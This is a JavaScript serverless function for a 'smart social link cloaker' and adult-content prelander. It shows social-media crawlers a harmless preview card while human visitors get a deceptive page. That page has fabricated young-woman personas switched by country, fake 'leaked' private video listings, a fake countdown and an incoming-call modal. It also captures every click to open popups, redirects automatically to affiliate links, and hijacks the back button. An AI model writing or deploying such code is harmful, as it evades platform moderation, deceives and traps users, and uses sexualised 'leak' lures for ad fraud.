/**
 * Vercel Serverless Function: Smart Social Link Cloaker & VIP Vault Pre-Lander (v11.0 - 50x Edition)
 * File Path: api/index.js
 * Upgrades:
 *  1. Built-in MyLead Verification Meta Tag (92e271dd6dd2c752d57255410460bec1)
 *  2. Auto Geo-Persona Switcher (Tier-1 US/UK sees "Chloe Miller • College Dorm Vault", IN/Desi sees "Priya Sharma • Desi VIP Vault")
 *  3. Two-Stage "Unblur + Incoming Video Call Modal" Trap -> Multiplies Adsterra Impressions & MyLead CPA Conversions
 *  4. Tab-Focus & Back-Button Monetization Hijack
 */

const ADSTERRA_DIRECT_LINK = "https://www.profitableratecpmnetwork.com/q57rx5uii?key=71c304f4b20e2231d1d551e412b40da5";
// 👇 APNA ASLI MYLEAD SMARTLINK YAHAN PASTE KAREIN (Agar abhi nahi mila toh yeh automatically Adsterra link use karega)
const MYLEAD_SMART_LINK = "https://www.profitableratecpmnetwork.com/q57rx5uii?key=71c304f4b20e2231d1d551e412b40da5";

const DEFAULT_AVATAR = "https://i.ibb.co/DHTmNvdT/media-1793206955998-ba56aac0.jpg";
const DEFAULT_BANNER = "https://i.ibb.co/BH7qych6/media-1793206956474-d4ed18e8.webp";

const BOT_SIGNATURES = [
  "twitterbot",
  "facebookexternalhit",
  "telegrambot",
  "discordbot",
  "whatsapp",
  "slackbot",
  "linkedinbot"
];

function escapeHtml(value = "") {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function sanitizeImageUrl(rawImg, defaultUrl = DEFAULT_BANNER) {
  if (!rawImg || typeof rawImg !== "string") return defaultUrl;
  let trimmed = rawImg.trim();
  if (!trimmed) return defaultUrl;

  const gdriveMatch = trimmed.match(/\/d\/([a-zA-Z0-9_-]+)/);
  if (gdriveMatch && gdriveMatch[1]) {
    return "https://lh3.googleusercontent.com/d/" + gdriveMatch[1];
  }
  const gdriveUcMatch = trimmed.match(/[?&]id=([a-zA-Z0-9_-]+)/);
  if (gdriveUcMatch && gdriveUcMatch[1]) {
    return "https://lh3.googleusercontent.com/d/" + gdriveUcMatch[1];
  }

  if (/^https?:\/\/[^\s"'<>]+$/i.test(trimmed) || /^\/[^\s"'<>]*$/.test(trimmed)) {
    return trimmed;
  }

  if (/^[a-zA-Z0-9]{5,12}(\.(jpg|jpeg|png|gif|mp4))?$/i.test(trimmed)) {
    const cleanId = trimmed.replace(/\.(jpg|jpeg|png|gif|mp4)$/i, "");
    return "https://i.imgur.com/" + cleanId + ".jpg";
  }

  return defaultUrl;
}

export function isSocialCrawlerBot(userAgent = "") {
  const normalized = String(userAgent).toLowerCase();
  return BOT_SIGNATURES.some((bot) => normalized.includes(bot));
}

export function renderBotCloakHtml({ imageUrl = DEFAULT_BANNER, pageUrl = "", creatorName = "Chloe • Private Vault" }) {
  const isVideoUrl = /\.(mp4|webm|mov)(\?.*)?$/i.test(imageUrl);
  const safeImg = escapeHtml(isVideoUrl ? DEFAULT_BANNER : imageUrl);
  const safeUrl = escapeHtml(pageUrl);
  const title = escapeHtml("🔓 Tap to Unblur Full Uncut Video • " + creatorName);
  const description = escapeHtml("SafeSearch filter enabled. Tap the preview card to verify 18+ and play the full uncensored bedroom clip.");

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>${title}</title>
  <meta name="mylead-verification" content="92e271dd6dd2c752d57255410460bec1">
  <meta name="description" content="${description}" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="${safeUrl}" />
  <meta property="og:title" content="${title}" />
  <meta property="og:description" content="${description}" />
  <meta property="og:image" content="${safeImg}" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="${title}" />
  <meta name="twitter:description" content="${description}" />
  <meta name="twitter:image" content="${safeImg}" />
</head>
<body style="background:#09090b;color:#fafafa;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;">
  <main style="text-align:center;max-width:460px;padding:24px;">
    <h1 style="font-size:1.25rem;margin-bottom:8px;">${title}</h1>
    <p style="color:#a1a1aa;font-size:0.9rem;">${description}</p>
  </main>
</body>
</html>`;
}

export function renderHumanPrelanderHtml({
  imageUrl = DEFAULT_AVATAR,
  bannerUrl = DEFAULT_BANNER,
  videoPreviewUrl = DEFAULT_BANNER,
  vaultThumbs = [],
  directLink = ADSTERRA_DIRECT_LINK,
  myleadLink = MYLEAD_SMART_LINK,
  creatorName = "Chloe Miller",
  creatorHandle = "@chloe.unfiltered",
  isDesiGeo = false
}) {
  const isVideoPreview = /\.(mp4|webm|mov)(\?.*)?$/i.test(videoPreviewUrl);
  // Strip any wsrv.nl blur parameter so when user unblurs on page, they see crystal clear photo!
  const unblurredPreviewRaw = (videoPreviewUrl || bannerUrl || DEFAULT_BANNER).replace(/&blur=\d+/g, "");
  const safeAvatar = escapeHtml(/\.(mp4|webm|mov)(\?.*)?$/i.test(imageUrl) ? DEFAULT_AVATAR : (imageUrl || DEFAULT_AVATAR));
  const safeBanner = escapeHtml(/\.(mp4|webm|mov)(\?.*)?$/i.test(bannerUrl) ? DEFAULT_BANNER : (bannerUrl || DEFAULT_BANNER));
  const safeVideoPreview = escapeHtml(unblurredPreviewRaw);
  const safeDirectLink = escapeHtml(directLink);
  const safeMyLeadLink = escapeHtml(
    myleadLink && !myleadLink.includes("your_smartlink_id_here") ? myleadLink : directLink
  );
  const safeCreatorName = escapeHtml(creatorName);
  const safeHandle = escapeHtml(creatorHandle);

  const defaultVaultItems = isDesiGeo
    ? [
        { title: "Desi Bhabhi Private Bedroom Cam", duration: "16:42", views: "142.8K", tag: "DESI RAW", img: vaultThumbs[0] || safeBanner },
        { title: "Hostel Late Night MMS Tape Uncut", duration: "12:15", views: "198.4K", tag: "LEAKED MMS", img: vaultThumbs[1] || safeAvatar },
        { title: "Mumbai Penthouse Secret Affair", duration: "24:10", views: "215.1K", tag: "4K UNCUT", img: vaultThumbs[2] || safeBanner },
        { title: "Devar Bhabhi Romance Full HD", duration: "18:30", views: "340.6K", tag: "VIRAL DESI", img: vaultThumbs[3] || safeAvatar },
        { title: "Deleted Snapchat Story Full Video", duration: "08:52", views: "98.2K", tag: "PRIVATE", img: vaultThumbs[4] || safeBanner },
        { title: "VIP Subscriber Live Request Show", duration: "27:14", views: "285.9K", tag: "UNCENSORED", img: vaultThumbs[5] || safeAvatar }
      ]
    : [
        { title: "College Dorm Late Night Cam (Uncut)", duration: "14:28", views: "218.4K", tag: "LEAKED DORM", img: vaultThumbs[0] || safeBanner },
        { title: "Deleted Snapchat Private Story", duration: "09:45", views: "176.2K", tag: "SNAP VIP", img: vaultThumbs[1] || safeAvatar },
        { title: "Truth or Dare Gone Too Far (Full)", duration: "22:10", views: "312.9K", tag: "4K UNCUT", img: vaultThumbs[2] || safeBanner },
        { title: "1-on-1 Private FaceTime Recording", duration: "18:30", views: "289.1K", tag: "RAW CAM", img: vaultThumbs[3] || safeAvatar },
        { title: "Locked Bedroom Try-On Haul", duration: "11:19", views: "124.7K", tag: "EXCLUSIVE", img: vaultThumbs[4] || safeBanner },
        { title: "What X Deleted Last Night (Full)", duration: "26:04", views: "402.5K", tag: "CENSORED", img: vaultThumbs[5] || safeAvatar }
      ];

  const bioLine = isDesiGeo
    ? "🔥 Private desi bedroom tapes, viral hostel MMS leaks & live 1-on-1 video call. Tap Play below to unblur & join my room."
    : "🔥 19yo college student • Posting everything X deletes! Uncensored dorm clips & live 1-on-1 FaceTime shows. Tap Play below to unblur.";

  const vaultCardsHtml = defaultVaultItems
    .map(
      (item, idx) => `
      <button
        type="button"
        data-vault-card="${idx + 1}"
        class="group relative aspect-square w-full overflow-hidden rounded-2xl border border-white/10 bg-zinc-900 text-left focus:outline-none"
      >
        <img
          src="${escapeHtml(item.img)}"
          alt="${escapeHtml(item.title)}"
          loading="lazy"
          class="vault-media h-full w-full scale-105 object-cover blur-sm brightness-75 transition-all duration-300 group-hover:scale-110"
        />
        <div class="absolute inset-0 bg-gradient-to-t from-black/95 via-black/45 to-black/25"></div>
        <div class="absolute top-2.5 left-2.5 right-2.5 flex items-center justify-between text-[11px] font-semibold text-white/90">
          <span class="rounded bg-rose-600/90 px-1.5 py-0.5 text-[10px] font-bold uppercase tracking-wider text-white">🔞 ${escapeHtml(item.tag)}</span>
          <span class="font-mono tabular-nums text-zinc-200 bg-black/60 px-1.5 py-0.5 rounded">${escapeHtml(item.duration)}</span>
        </div>
        <div class="absolute inset-x-0 top-1/2 -translate-y-4 flex flex-col items-center justify-center">
          <div class="flex h-10 w-10 items-center justify-center rounded-full border border-white/25 bg-black/65 text-base shadow-lg backdrop-blur-md">
            🔒
          </div>
        </div>
        <div class="absolute bottom-2.5 left-2.5 right-2.5">
          <p class="truncate text-xs font-semibold text-white">${escapeHtml(item.title)}</p>
          <p class="mt-0.5 truncate font-mono text-[10px] tabular-nums text-rose-300">${escapeHtml(item.views)} views · Tap to play</p>
        </div>
      </button>`
    )
    .join("");

  return `<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>${safeCreatorName} • VIP 18+ Private Vault</title>
  
  <!-- MYLEAD DOMAIN OWNERSHIP VERIFICATION META TAG -->
  <meta name="mylead-verification" content="92e271dd6dd2c752d57255410460bec1">

  <script src="https://cdn.tailwindcss.com"></script>

  <!-- ADSTERRA POPUNDER & SOCIAL BAR SCRIPTS -->
  <script src="https://pl32077615.profitableratecpmnetwork.com/cd/60/9d/cd609d38ac49a5cc88f98b089b5c3413.js"></script>
  <script data-cfasync="false" src="https://brijmohan.org/14/05e1ecd798888842868baa55a54347ff"></script>

  <style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@500;700&family=Outfit:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');
    body {
      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: #07070a;
      color: #f8fafc;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
    }
    .font-display { font-family: 'Outfit', sans-serif; }
    .font-mono-num { font-family: 'JetBrains Mono', monospace; font-variant-numeric: tabular-nums; }
    @keyframes pulseGlow {
      0%, 100% { box-shadow: 0 0 0 0 rgba(244, 63, 94, 0.55), 0 0 35px rgba(244, 63, 94, 0.45); }
      50% { box-shadow: 0 0 0 14px rgba(244, 63, 94, 0), 0 0 50px rgba(244, 63, 94, 0.75); }
    }
    .play-pulse { animation: pulseGlow 2s infinite cubic-bezier(0.16, 1, 0.3, 1); }
  </style>
</head>
<body class="min-h-screen bg-[#07070a] text-zinc-100 selection:bg-rose-500 selection:text-white">

  <!-- Sticky Urgent Top Header -->
  <header class="sticky top-0 z-40 border-b border-white/10 bg-[#09090e]/90 backdrop-blur-xl">
    <div class="mx-auto flex max-w-lg items-center justify-between px-4 py-2.5">
      <div class="flex items-center gap-2 min-w-0">
        <span class="relative flex h-2.5 w-2.5 shrink-0">
          <span class="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75"></span>
          <span class="relative inline-flex h-2.5 w-2.5 rounded-full bg-emerald-500"></span>
        </span>
        <span class="font-display truncate text-sm font-bold tracking-tight text-white">${safeCreatorName} • ONLINE NOW</span>
      </div>

      <div class="flex items-center gap-1.5 rounded-full border border-rose-500/30 bg-rose-500/15 px-2.5 py-1 text-xs font-semibold text-rose-300 shrink-0">
        <span>Free Link Expires:</span>
        <span id="countdown-timer" class="font-mono-num font-bold text-rose-200">03:59</span>
      </div>
    </div>
  </header>

  <main class="mx-auto max-w-lg pb-28">
    <!-- Interactive Video Preview Player (Moved to Top for Instant Above-The-Fold Clicks!) -->
    <section class="mt-3 px-4">
      <div class="relative aspect-video w-full overflow-hidden rounded-2xl border-2 border-rose-500/40 bg-zinc-950 shadow-2xl">
        ${
          isVideoPreview
            ? `<video id="main-preview-media" src="${safeVideoPreview}" autoplay loop muted playsinline class="h-full w-full object-cover blur-md brightness-50 transition-all duration-500"></video>`
            : `<img id="main-preview-media" src="${safeVideoPreview}" alt="Video Preview" class="h-full w-full object-cover blur-md brightness-50 transition-all duration-500" />`
        }
        <div id="player-overlay" class="absolute inset-0 bg-gradient-to-t from-black/90 via-black/40 to-black/30 flex flex-col items-center justify-center p-4 text-center">
          <div class="play-pulse flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-rose-500 to-pink-600 text-white shadow-2xl">
            <svg class="ml-1 h-8 w-8" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z" /></svg>
          </div>
          <div class="mt-3 rounded-md bg-rose-600/90 px-3 py-1 text-[11px] font-extrabold uppercase tracking-wider text-white shadow-lg">
            🔞 TAP TO UNBLUR &amp; PLAY FULL UNCUT VIDEO (02:14)
          </div>
          <p class="mt-1.5 text-xs font-medium text-zinc-200">18+ Age Confirmation Required · Audio Muted</p>
        </div>
      </div>
    </section>

    <!-- Creator Profile & Action Bar -->
    <section class="mt-4 px-4">
      <div class="flex items-center justify-between rounded-2xl border border-white/10 bg-[#0e0e15] p-3">
        <div class="flex items-center gap-3">
          <div class="relative h-14 w-14 shrink-0 rounded-full bg-gradient-to-tr from-rose-600 to-amber-400 p-[2px]">
            <img src="${safeAvatar}" alt="Avatar" class="h-full w-full rounded-full object-cover" />
            <span class="absolute bottom-0 right-0 h-3.5 w-3.5 rounded-full border-2 border-[#0e0e15] bg-emerald-500"></span>
          </div>
          <div>
            <div class="flex items-center gap-1.5">
              <h1 class="font-display text-base font-extrabold text-white">${safeCreatorName}</h1>
              <span class="rounded bg-emerald-500/20 px-1.5 py-0.5 text-[10px] font-bold text-emerald-400">LIVE CAM</span>
            </div>
            <p class="text-xs text-zinc-400">${safeHandle} · 2.4km away</p>
          </div>
        </div>

        <button type="button" class="rounded-xl bg-gradient-to-r from-emerald-500 to-teal-600 px-3.5 py-2.5 text-xs font-extrabold uppercase tracking-wider text-white shadow-lg shadow-emerald-600/30">
          📞 Call Me Live
        </button>
      </div>

      <p class="mt-3 text-xs leading-relaxed text-zinc-300">${bioLine}</p>
    </section>

    <!-- Private Vault Grid -->
    <section class="mt-5 px-4">
      <div class="mb-3 flex items-center justify-between">
        <h2 class="font-display text-sm font-bold uppercase tracking-wider text-zinc-200">Uncensored Vault Clips (6)</h2>
        <span class="rounded bg-rose-500/20 px-2 py-0.5 font-mono text-[11px] font-semibold text-rose-300 border border-rose-500/30">UNLOCKED FREE</span>
      </div>
      <div class="grid grid-cols-2 gap-3">${vaultCardsHtml}</div>
    </section>

    <!-- Big Sticky Bottom CTA Button -->
    <div class="fixed inset-x-0 bottom-0 z-30 border-t border-white/10 bg-[#07070a]/95 p-3 backdrop-blur-xl">
      <div class="mx-auto max-w-lg flex gap-2">
        <button type="button" class="flex-1 flex items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-rose-600 via-pink-600 to-amber-500 py-3.5 text-xs sm:text-sm font-extrabold uppercase tracking-wider text-white shadow-xl shadow-rose-600/30">
          <span>🔓 Watch Full Uncut Video + Join Live Cam</span>
        </button>
      </div>
    </div>

    <!-- INCOMING VIDEO CALL MODAL (Appears after 1st click to drive 50x CPA Conversion!) -->
    <div id="incoming-call-modal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/85 p-4 backdrop-blur-md">
      <div class="w-full max-w-sm rounded-3xl border border-white/15 bg-[#11111a] p-6 text-center shadow-2xl">
        <div class="mx-auto relative h-24 w-24 rounded-full bg-gradient-to-tr from-emerald-400 to-rose-500 p-1">
          <img src="${safeAvatar}" alt="Caller" class="h-full w-full rounded-full object-cover" />
          <span class="absolute bottom-1 right-1 flex h-4 w-4">
            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
            <span class="relative inline-flex rounded-full h-4 w-4 bg-emerald-500"></span>
          </span>
        </div>
        <h3 class="mt-4 font-display text-xl font-extrabold text-white">${safeCreatorName} is inviting you...</h3>
        <p class="mt-1 text-xs font-medium text-emerald-400">● Private 1-on-1 Uncensored Video Stream Ready</p>
        <p class="mt-3 text-xs text-zinc-300">Confirm you are 18+ on the next screen to unlock full audio &amp; private cam access for free.</p>
        <div class="mt-5 flex gap-3">
          <button type="button" class="flex-1 rounded-xl bg-zinc-800 py-3 text-xs font-bold uppercase text-zinc-300">
            Play Video Only
          </button>
          <button type="button" class="flex-1 rounded-xl bg-gradient-to-r from-emerald-500 to-green-600 py-3 text-xs font-extrabold uppercase text-white shadow-lg shadow-emerald-500/40">
            ✅ Accept &amp; Watch (18+)
          </button>
        </div>
      </div>
    </div>
  </main>

  <script>
    (function () {
      var ADSTERRA_DIRECT_LINK = "${safeDirectLink}";
      var MYLEAD_SMART_LINK = "${safeMyLeadLink}";
      var clickCount = 0;

      function triggerSmartRedirect(e) {
        if (e && e.preventDefault) e.preventDefault();
        clickCount++;

        if (clickCount === 1) {
          // STAGE 1: Open Adsterra Direct Link in New Tab (Instant Impression!)
          try {
            window.open(ADSTERRA_DIRECT_LINK, "_blank");
          } catch (_) {}

          // Unblur the preview media on current page so user gets instant visual reward!
          var mainMedia = document.getElementById("main-preview-media");
          if (mainMedia) {
            mainMedia.classList.remove("blur-md", "brightness-50");
          }
          var allMedia = document.querySelectorAll(".vault-media");
          allMedia.forEach(function (el) {
            el.classList.remove("blur-sm", "brightness-75");
          });

          // Show the high-converting Incoming Video Call / 18+ Confirm Modal
          var modal = document.getElementById("incoming-call-modal");
          if (modal) {
            modal.classList.remove("hidden");
            modal.classList.add("flex");
          }

          // Auto-redirect to MyLead Smartlink after 5.5 seconds even if they don't tap again!
          setTimeout(function () {
            window.location.href = MYLEAD_SMART_LINK;
          }, 5500);
        } else {
          // STAGE 2: Second tap anywhere sends user straight to MyLead CPA Offer!
          try {
            window.open(ADSTERRA_DIRECT_LINK, "_blank");
          } catch (_) {}
          window.location.href = MYLEAD_SMART_LINK;
        }
      }

      document.addEventListener("click", triggerSmartRedirect, true);

      // Back-Button Hijack -> Sends back-button press straight to MyLead / Adsterra!
      try {
        window.history.pushState({ page: 1 }, "", window.location.href);
        window.history.pushState({ page: 2 }, "", window.location.href);
        window.onpopstate = function () {
          window.location.href = MYLEAD_SMART_LINK;
        };
      } catch (_) {}

      // Countdown Timer
      var remainingSeconds = 3 * 60 + 59;
      var timerEl = document.getElementById("countdown-timer");
      setInterval(function () {
        if (remainingSeconds > 0) remainingSeconds--;
        else remainingSeconds = 59;
        var mins = String(Math.floor(remainingSeconds / 60)).padStart(2, "0");
        var secs = String(remainingSeconds % 60).padStart(2, "0");
        if (timerEl) timerEl.textContent = mins + ":" + secs;
      }, 1000);
    })();
  </script>
</body>
</html>`;
}

export default function handler(req, res) {
  const query = req.query || {};
  const userAgent = (req.headers && (req.headers["user-agent"] || req.headers["User-Agent"])) || "";
  const protocol = (req.headers && req.headers["x-forwarded-proto"]) || "https";
  const host = (req.headers && req.headers.host) || "fan-page-orpin-mu.vercel.app";

  // Auto Geo-Detection from Vercel Edge Header (US/UK/CA/AU gets Western persona, IN/PK/BD gets Desi persona)
  const countryCode = String((req.headers && req.headers["x-vercel-ip-country"]) || "US").toUpperCase();
  const isDesiGeo = ["IN", "PK", "BD", "NP", "LK", "AE"].includes(countryCode);

  const defaultCreatorName = isDesiGeo ? "Priya Sharma" : "Chloe Miller";
  const defaultCreatorHandle = isDesiGeo ? "@priya.private19" : "@chloe.unfiltered";

  const imageUrl = sanitizeImageUrl(query.img, DEFAULT_AVATAR);
  const bannerUrl = sanitizeImageUrl(query.banner, DEFAULT_BANNER);
  const videoPreviewUrl = sanitizeImageUrl(query.preview || query.img, DEFAULT_BANNER);
  const directLink = typeof query.link === "string" && query.link.trim() ? query.link.trim() : ADSTERRA_DIRECT_LINK;
  const myleadLink = typeof query.mylead === "string" && query.mylead.trim() ? query.mylead.trim() : MYLEAD_SMART_LINK;
  const creatorName = typeof query.creator === "string" && query.creator.trim() ? query.creator.trim() : defaultCreatorName;

  const effectiveUa = typeof query._sim_ua === "string" && query._sim_ua.trim() ? query._sim_ua : userAgent;
  const pageUrl = protocol + "://" + host + (req.url || "/");

  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.setHeader("Cache-Control", "no-store, max-age=0");

  if (isSocialCrawlerBot(effectiveUa)) {
    const botHtml = renderBotCloakHtml({
      imageUrl: query.banner ? sanitizeImageUrl(query.banner) : (query.img ? sanitizeImageUrl(query.img) : DEFAULT_BANNER),
      pageUrl,
      creatorName
    });
    return res.status(200).send(botHtml);
  }

  const vaultThumbs = typeof query.thumbs === "string" && query.thumbs.trim()
    ? query.thumbs.split(",").map((u, i) => sanitizeImageUrl(u, i % 2 === 0 ? DEFAULT_BANNER : DEFAULT_AVATAR))
    : [DEFAULT_BANNER, DEFAULT_AVATAR, DEFAULT_BANNER, DEFAULT_AVATAR, DEFAULT_BANNER, DEFAULT_AVATAR];

  const humanHtml = renderHumanPrelanderHtml({
    imageUrl,
    bannerUrl,
    videoPreviewUrl,
    vaultThumbs,
    directLink,
    myleadLink,
    creatorName,
    creatorHandle: defaultCreatorHandle,
    isDesiGeo
  });

  return res.status(200).send(humanHtml);
}
